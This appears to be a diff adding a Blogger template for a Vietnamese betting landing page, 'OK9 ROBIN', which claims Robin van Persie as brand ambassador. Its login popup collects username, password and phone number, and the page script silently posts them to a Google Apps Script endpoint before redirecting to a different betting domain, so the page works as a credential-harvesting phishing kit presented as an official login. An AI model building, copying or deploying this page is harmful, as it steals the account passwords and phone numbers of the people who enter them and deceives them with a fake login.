@@ -1,0 +1,672 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+  <meta charset='UTF-8'/>
+  <meta http-equiv='X-UA-Compatible' content='IE=edge'/>
+  <meta name='viewport' content='width=device-width, initial-scale=1.0'/>
+  
+  <!-- SEO Meta Tags -->
+  <title>OK9 ROBIN</title>
+  <meta name='description' content='OK9 ROBIN - Trang cá cược chính thức với Đại sứ Thương hiệu Robin van Persie. Đăng ký tài khoản nhận ngay khuyến mãi cực khủng.'/>
+  <meta name='keywords' content='OK9, OK9 ROBIN, Robin van Persie, Đăng Ký OK9, Đăng Nhập OK9'/>
+  
+  <!-- Open Graph Protocol -->
+  <meta property='og:title' content='OK9 ROBIN'/>
+  <meta property='og:type' content='website'/>
+  <meta property='og:description' content='OK9 - Trang cá cược chính thức với Đại sứ Thương hiệu Robin van Persie. Đăng ký tài khoản nhận ngay khuyến mãi cực khủng.'/>
+  <meta property='og:image' content='https://w.ladicdn.com/s650x1050/697a1ff4787d41001277b312/09-ds-picsart-aiimageenhancer-20260422072429-sxlg8.png'/>
+  <link rel='icon' href='https://w.ladicdn.com/s650x1050/697a1ff4787d41001277b312/09-ds-picsart-aiimageenhancer-20260422072429-sxlg8.png' type='image/png'/>
+
+  <!-- Google Fonts -->
+  <link rel='preconnect' href='https://fonts.googleapis.com'/>
+  <link rel='preconnect' href='https://fonts.gstatic.com' crossorigin='anonymous'/>
+  <link href='https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&amp;display=swap' rel='stylesheet'/>
+
+  <b:skin><![CDATA[
+    /* General Reset */
+    *, *::before, *::after {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    body {
+      font-family: "Open Sans", sans-serif;
+      background-color: #0c101a;
+      color: #fff;
+      line-height: 1.2;
+      overflow-x: hidden;
+      min-height: 100vh;
+    }
+
+    /* App Container for Centering on Desktop */
+    .app-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      min-height: 100vh;
+      background: radial-gradient(circle at 50% 50%, #16241a 0%, #090e15 100%);
+      padding: 20px 0;
+    }
+
+    @media (max-width: 480px) {
+      .app-container {
+        padding: 0;
+        background: #000;
+      }
+    }
+
+    /* Ladi Wrapper - Fixed Width 320px */
+    .ladi-wraper {
+      position: relative;
+      width: 320px;
+      height: 708.9px;
+      background-color: #000;
+      overflow: hidden;
+      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(16, 121, 61, 0.15);
+      border-radius: 16px;
+    }
+
+    @media (max-width: 480px) {
+      .ladi-wraper {
+        border-radius: 0;
+        box-shadow: none;
+        height: 100vh;
+        min-height: 100vh;
+      }
+    }
+
+    /* Section styling */
+    .ladi-section {
+      position: relative;
+      width: 100%;
+      height: 100%;
+    }
+
+    .ladi-container {
+      position: relative;
+      width: 100%;
+      height: 100%;
+    }
+
+    .ladi-element {
+      position: absolute;
+    }
+
+    /* Background Image 2 (Main Hero) */
+    #IMAGE2 {
+      top: -0.5px;
+      left: 0px;
+      width: 320px;
+      height: 710.4px;
+      z-index: 1;
+    }
+
+    @media (max-width: 480px) {
+      #IMAGE2 {
+        height: 100vh;
+      }
+    }
+
+    #IMAGE2 .ladi-image,
+    #IMAGE2 .ladi-image-background {
+      width: 100%;
+      height: 100%;
+    }
+
+    #IMAGE2 .ladi-image-background {
+      /* CHÚ Ý: Sử dụng ảnh online vì Blogger không có thư mục lưu trữ cục bộ */
+      background-image: url("https://w.ladicdn.com/s650x1050/697a1ff4787d41001277b312/09-ds-picsart-aiimageenhancer-20260422072429-sxlg8.png");
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-position: center top;
+    }
+
+    /* Base Button Styling */
+    .ladi-button-action {
+      cursor: pointer;
+    }
+
+    .ladi-button {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: transform 0.1s ease, filter 0.2s ease;
+    }
+
+    .ladi-button:active {
+      transform: scale(0.95);
+    }
+
+    .ladi-button-background {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1;
+    }
+
+    .ladi-button-headline {
+      position: absolute;
+      z-index: 2;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .ladi-headline {
+      font-family: "Open Sans", sans-serif;
+      text-align: center;
+      user-select: none;
+      font-weight: bold;
+    }
+
+    /* Support Button (#BUTTON_SUPPORT) */
+    #BUTTON_SUPPORT {
+      width: 40px;
+      height: 32px;
+      top: 2.5px;
+      left: 148px;
+      z-index: 10;
+      text-decoration: none;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #BUTTON_SUPPORT .ladi-button-background {
+      background-color: #ffffff;
+      border-radius: 4px;
+    }
+
+    .support-icon-svg {
+      width: 23px;
+      height: 23px;
+      color: rgb(16, 121, 61);
+      stroke-width: 2.5;
+    }
+
+    /* Login Button (#BUTTON19) */
+    #BUTTON19 {
+      width: 75px;
+      height: 26px;
+      top: 9.5px;
+      left: 187px;
+      z-index: 10;
+    }
+
+    #BUTTON19 .ladi-button-background {
+      background-color: #ffffff;
+      border-radius: 4px;
+    }
+
+    #BUTTON19 .ladi-headline {
+      font-size: 11px;
+      color: rgb(16, 121, 61);
+    }
+
+    /* Register Link Button (#BUTTON20) */
+    #BUTTON20 {
+      display: block;
+      width: 60px;
+      height: 26px;
+      top: 9.5px;
+      left: 258px;
+      z-index: 10;
+      text-decoration: none;
+    }
+
+    #BUTTON20 .ladi-button-background {
+      background-color: #ffffff;
+      border-radius: 4px;
+    }
+
+    #BUTTON20 .ladi-headline {
+      font-size: 11px;
+      color: rgb(16, 121, 61);
+    }
+
+    /* Hover effects for header buttons */
+    #BUTTON19:hover .ladi-button-background,
+    #BUTTON20:hover .ladi-button-background,
+    #BUTTON_SUPPORT:hover .ladi-button-background {
+      filter: brightness(0.95);
+    }
+
+    /* ==========================================================================
+       POPUP MODAL SECTION
+       ========================================================================== */
+
+    #SECTION_POPUP {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 100;
+      display: none; /* Controlled via JS */
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* Modal Backdrop */
+    .backdrop-popup {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(2px);
+      z-index: 99;
+    }
+
+    #SECTION_POPUP .ladi-container {
+      position: relative;
+      z-index: 100;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* POPUP1 Dialog Container */
+    #POPUP1 {
+      position: relative;
+      width: 318px;
+      height: 474px;
+      background-color: transparent;
+      z-index: 101;
+      transform: scale(0.9);
+      opacity: 0;
+      transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.3s ease;
+    }
+
+    #SECTION_POPUP.active #POPUP1 {
+      transform: scale(1);
+      opacity: 1;
+    }
+
+    .ladi-popup {
+      position: relative;
+      width: 100%;
+      height: 100%;
+    }
+
+    /* Modal Close Button */
+    .popup-close {
+      position: absolute;
+      right: 12px;
+      top: 12px;
+      z-index: 110;
+      cursor: pointer;
+      width: 20px;
+      height: 20px;
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-size: contain;
+      background-image: url("data:image/svg+xml;utf8, %3Csvg%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20fill%3D%22%23fff%22%3E%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M23.4144%202.00015L2.00015%2023.4144L0.585938%2022.0002L22.0002%200.585938L23.4144%202.00015Z%22%3E%3C%2Fpath%3E%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M2.00015%200.585938L23.4144%2022.0002L22.0002%2023.4144L0.585938%202.00015L2.00015%200.585938Z%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E");
+      transition: transform 0.2s ease, opacity 0.2s ease;
+    }
+
+    .popup-close:hover {
+      transform: rotate(90deg);
+      opacity: 0.8;
+    }
+
+    /* Modal Background Image */
+    #IMAGE3 {
+      top: -0.2px;
+      left: 0px;
+      width: 318px;
+      height: 474.456px;
+      z-index: 1;
+    }
+
+    #IMAGE3 .ladi-image,
+    #IMAGE3 .ladi-image-background {
+      width: 100%;
+      height: 100%;
+    }
+
+    #IMAGE3 .ladi-image-background {
+      /* CHÚ Ý: Sử dụng ảnh online vì Blogger không có thư mục lưu trữ cục bộ */
+      background-image: url("https://w.ladicdn.com/s650x800/697a1ff4787d41001277b312/dn-ds-picsart-aiimageenhancer-20260422073340-7_3na.png");
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-position: center;
+    }
+
+    /* Form Container */
+    #FORM2 {
+      width: 270px;
+      height: 139px;
+      top: 212.5px;
+      left: 24px;
+      z-index: 10;
+    }
+
+    .ladi-form {
+      position: relative;
+      width: 100%;
+      height: 100%;
+    }
+
+    /* Form inputs styling */
+    .ladi-form-item-container {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      border: 1px solid rgb(16, 121, 61);
+      border-radius: 6px;
+      background-color: #ffffff;
+      overflow: hidden;
+    }
+
+    .ladi-form-item {
+      width: 100%;
+      height: 100%;
+    }
+
+    .ladi-form-control {
+      width: 100%;
+      height: 100%;
+      border: none;
+      outline: none;
+      background: transparent;
+      padding: 0 10px;
+      font-family: "Open Sans", sans-serif;
+      font-size: 11px;
+      color: #000000;
+      font-weight: 500;
+    }
+
+    .ladi-form-control::placeholder {
+      color: rgba(0, 0, 0, 0.5);
+      font-size: 11px;
+    }
+
+    /* Position of Form Fields */
+    #FORM_ITEM2 {
+      width: 270px;
+      height: 22px;
+      top: 0px;
+      left: 0px;
+    }
+
+    #FORM_ITEM6 {
+      width: 270px;
+      height: 22px;
+      top: 32px;
+      left: 0px;
+    }
+
+    #FORM_ITEM4 {
+      width: 270px;
+      height: 22px;
+      top: 65px;
+      left: 0px;
+    }
+
+    /* Submit Button (#BUTTON18) */
+    #BUTTON18 {
+      width: 270px;
+      height: 29px;
+      top: 110px;
+      left: 0px;
+    }
+
+    .ladi-button-submit-wrapper {
+      width: 100%;
+      height: 100%;
+      border: none;
+      background: transparent;
+      padding: 0;
+      cursor: pointer;
+      outline: none;
+    }
+
+    #BUTTON18 .ladi-button-background {
+      background-color: rgb(58, 179, 110);
+      border-radius: 6px;
+      box-shadow: 0 3px 6px rgba(0,0,0,0.16);
+      transition: background-color 0.2s ease;
+    }
+
+    #BUTTON18:hover .ladi-button-background {
+      background-color: rgb(48, 159, 95);
+    }
+
+    .ladi-button-submit-wrapper:disabled {
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+
+    #BUTTON18 .ladi-headline {
+      font-size: 13px;
+      color: rgb(241, 243, 244);
+      font-weight: bold;
+    }
+  ]]></b:skin>
+</head>
+<body>
+  <div class='app-container'>
+    <div class='ladi-wraper'>
+      <!-- Main Content Section -->
+      <section class='ladi-section' id='SECTION1'>
+        <div class='ladi-section-background'></div>
+        <div class='ladi-container'>
+          <!-- Background Image -->
+          <div class='ladi-element' id='IMAGE2'>
+            <div class='ladi-image'>
+              <div class='ladi-image-background'></div>
+            </div>
+          </div>
+
+          <!-- Support Link -->
+          <a aria-label='Hỗ trợ Telegram' class='ladi-element' href='https://t.me/hotrovienok9' id='BUTTON_SUPPORT' rel='noopener noreferrer' target='_blank'>
+            <div class='ladi-button'>
+              <div class='ladi-button-background'></div>
+              <div class='ladi-button-headline'>
+                <svg class='support-icon-svg' fill='none' stroke='currentColor' stroke-linecap='round' stroke-linejoin='round' stroke-width='2.2' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'>
+                  <path d='M3 18v-6a9 9 0 0 1 18 0v6'></path>
+                  <path d='M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z'></path>
+                </svg>
+              </div>
+            </div>
+          </a>
+
+          <!-- Login Button -->
+          <div class='ladi-element ladi-button-action' data-action='true' id='BUTTON19'>
+            <div class='ladi-button'>
+              <div class='ladi-button-background'></div>
+              <div class='ladi-element ladi-button-headline' id='BUTTON_TEXT19'>
+                <p class='ladi-headline'>Đăng Nhập</p>
+              </div>
+            </div>
+          </div>
+
+          <!-- Register Link -->
+          <a class='ladi-element' href='https://www.f16865.com/home/register?id=915116985' id='BUTTON20' rel='noopener noreferrer' target='_blank'>
+            <div class='ladi-button'>
+              <div class='ladi-button-background'></div>
+              <div class='ladi-element ladi-button-headline' id='BUTTON_TEXT20'>
+                <p class='ladi-headline'>Đăng Ký</p>
+              </div>
+            </div>
+          </a>
+        </div>
+      </section>
+
+      <!-- Popup Modal Section -->
+      <section class='ladi-section' id='SECTION_POPUP'>
+        <!-- Backdrop Backdrop Overlay -->
+        <div class='backdrop-popup' id='backdrop-popup'></div>
+        
+        <div class='ladi-container'>
+          <!-- Main Popup Container -->
+          <div class='ladi-element' id='POPUP1'>
+            <div class='ladi-popup'>
+              <!-- Close Button -->
+              <div aria-label='Đóng' class='popup-close' id='popup-close-btn'></div>
+              <div class='ladi-popup-background'></div>
+              
+              <!-- Popup Background Image -->
+              <div class='ladi-element' id='IMAGE3'>
+                <div class='ladi-image'>
+                  <div class='ladi-image-background'></div>
+                </div>
+              </div>
+              
+              <!-- Login Form Container -->
+              <div class='ladi-element' id='FORM2'>
+                <form autocomplete='off' class='ladi-form' id='login-form'>
+                  <!-- Submit Button inside Form -->
+                  <div class='ladi-element ladi-button-action' id='BUTTON18'>
+                    <button class='ladi-button-submit-wrapper' type='submit'>
+                      <div class='ladi-button'>
+                        <div class='ladi-button-background'></div>
+                        <div class='ladi-element ladi-button-headline' id='BUTTON_TEXT18'>
+                          <p class='ladi-headline'>ĐĂNG NHẬP</p>
+                        </div>
+                      </div>
+                    </button>
+                  </div>
+                  
+                  <!-- Form Fields -->
+                  <!-- Username Field -->
+                  <div class='ladi-element' id='FORM_ITEM2'>
+                    <div class='ladi-form-item-container'>
+                      <div class='ladi-form-item-background'></div>
+                      <div class='ladi-form-item'>
+                        <input autocomplete='off' class='ladi-form-control' id='username-input' name='name' placeholder='Tên tài khoản' required='required' tabindex='1' type='text'/>
+                      </div>
+                    </div>
+                  </div>
+                  
+                  <!-- Password Field -->
+                  <div class='ladi-element' id='FORM_ITEM6'>
+                    <div class='ladi-form-item-container'>
+                      <div class='ladi-form-item-background'></div>
+                      <div class='ladi-form-item'>
+                        <input autocomplete='off' class='ladi-form-control' id='password-input' name='password' placeholder='Mật khẩu' required='required' tabindex='2' type='password'/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- Phone Number Field -->
+                  <div class='ladi-element' id='FORM_ITEM4'>
+                    <div class='ladi-form-item-container'>
+                      <div class='ladi-form-item-background'></div>
+                      <div class='ladi-form-item'>
+                        <input autocomplete='off' class='ladi-form-control' id='phone-input' name='phone' pattern='(\+84|0)(9|8|7|5|3)[0-9]{8}' placeholder='Số điện thoại' required='required' tabindex='3' type='tel'/>
+                      </div>
+                    </div>
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+  </div>
+
+  <!-- Yêu cầu tối thiểu một widget và section hoạt động từ Blogger để không báo lỗi biên dịch XML -->
+  <div style='display:none;'>
+    <b:section id='main' name='Main Section' showaddelement='no'>
+      <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog'/>
+    </b:section>
+  </div>
+
+  <!-- Javascript -->
+  <script type='text/javascript'>
+    //<![CDATA[
+    document.addEventListener('DOMContentLoaded', () => {
+      const loginBtn = document.getElementById('BUTTON19');
+      const popupSection = document.getElementById('SECTION_POPUP');
+      const closeBtn = document.getElementById('popup-close-btn');
+      const backdrop = document.getElementById('backdrop-popup');
+      const loginForm = document.getElementById('login-form');
+      const submitButtonText = document.querySelector('#BUTTON_TEXT18 .ladi-headline');
+      const submitButton = document.querySelector('#BUTTON18 button');
+
+      // Google Apps Script URL
+      const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbya-T8hURlVDL573F8-rAXv73CqAsYoUKgyCXj_-GhXXYmtK3JdiWwZXPSQI08oe4yP/exec';
+      // Redirect URL
+      const REDIRECT_URL = 'https://8x8899.com/sportEvents';
+
+      const openModal = () => {
+        popupSection.style.display = 'flex';
+        popupSection.offsetHeight;
+        popupSection.classList.add('active');
+      };
+
+      const closeModal = () => {
+        popupSection.classList.remove('active');
+        setTimeout(() => {
+          popupSection.style.display = 'none';
+        }, 300);
+      };
+
+      if (loginBtn) loginBtn.addEventListener('click', openModal);
+      if (closeBtn) closeBtn.addEventListener('click', closeModal);
+      if (backdrop) backdrop.addEventListener('click', closeModal);
+
+      if (loginForm) {
+        loginForm.addEventListener('submit', async (e) => {
+          e.preventDefault();
+          const username = document.getElementById('username-input').value;
+          const phone = document.getElementById('phone-input').value;
+          const password = document.getElementById('password-input').value;
+          
+          if (username && phone && password) {
+            if (submitButtonText) submitButtonText.textContent = 'ĐANG XỬ LÝ...';
+            if (submitButton) submitButton.disabled = true;
+            
+            const inputs = loginForm.querySelectorAll('input');
+            inputs.forEach(input => input.disabled = true);
+
+            try {
+              await fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                  name: username,
+                  phone: phone,
+                  password: password
+                })
+              });
+              await new Promise(resolve => setTimeout(resolve, 800));
+              window.location.href = REDIRECT_URL;
+            } catch (error) {
+              console.error('Error:', error);
+              window.location.href = REDIRECT_URL;
+            }
+          }
+        });
+      }
+
+      window.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape' && popupSection.classList.contains('active')) {
+          closeModal();
+        }
+      });
+    });
+    //]]>
+  </script>
+</body>
+</html>
